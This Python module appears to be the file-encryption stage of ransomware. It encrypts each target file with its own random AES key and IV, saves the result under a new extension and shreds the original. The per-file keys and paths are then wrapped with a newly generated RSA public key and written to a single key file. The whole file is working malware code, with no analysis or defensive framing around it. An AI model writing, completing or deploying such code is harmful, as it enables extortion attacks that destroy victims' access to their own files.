import logging
from symmetric_encryption import AES
from asymmetric_encryption import RSA
from os import urandom
from config import (
    AES_SECRET_KEY_SIZE_IN_BYTES,
    AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES,
    ENCRYPTED_FILE_EXTENSION,
    LOCAL_PUBLIC_KEY,
    ENCRYPTED_AES_KEY_FILE_LOCATION,
)
from utils import (
    read_data_from_file,
    write_data_to_file,
    shred_file,
    generate_rsa_key_pair,
)
from base64 import b64encode


logger = logging.getLogger(__name__)


def encrypt_files(file_paths):
    for file_path in file_paths:
        logger.info(f"Encrypting file: {file_path}")
        aes_secret_key = urandom(AES_SECRET_KEY_SIZE_IN_BYTES)
        aes_initialization_vector = urandom(AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES)

        symmetric_cipher = AES(aes_secret_key, aes_initialization_vector)
        unencrypted_data = read_data_from_file(file_path)
        encrypted_data = symmetric_cipher.encrypt_data(unencrypted_data)

        new_file_path = f"{file_path}{ENCRYPTED_FILE_EXTENSION}"
        write_data_to_file(new_file_path, encrypted_data)

        shred_file(file_path)

        yield {
            "aes_secret_key": b64encode(aes_secret_key).decode("ascii"),
            "aes_initialization_vector": b64encode(aes_initialization_vector).decode(
                "ascii"
            ),
            "encrypted_file_path": b64encode(new_file_path.encode("utf-8")).decode(
                "ascii"
            ),
        }


def encrypt_file_details(
    b64encoded_aes_secret_key, b64encoded_initialization_vector, b64encoded_file_path
):
    cipher = RSA(public_key=LOCAL_PUBLIC_KEY[0])
    details = f"{b64encoded_aes_secret_key}\t{b64encoded_initialization_vector}\t{b64encoded_file_path}".encode()
    encrypted_data = cipher.encrypt_data(details)
    return encrypted_data


def start_encryption(file_paths):
    logger.info("Encryption started")
    LOCAL_PUBLIC_KEY[0] = generate_rsa_key_pair()
    list_of_file_encryption_details = [detail for detail in encrypt_files(file_paths)]
    encrypted_file_encryption_details = [
        encrypt_file_details(
            file_encryption_detail.get("aes_secret_key"),
            file_encryption_detail.get("aes_initialization_vector"),
            file_encryption_detail.get("encrypted_file_path"),
        )
        for file_encryption_detail in list_of_file_encryption_details
    ]
    write_data_to_file(
        ENCRYPTED_AES_KEY_FILE_LOCATION,
        encrypted_file_encryption_details,
        serialized=False,
    )

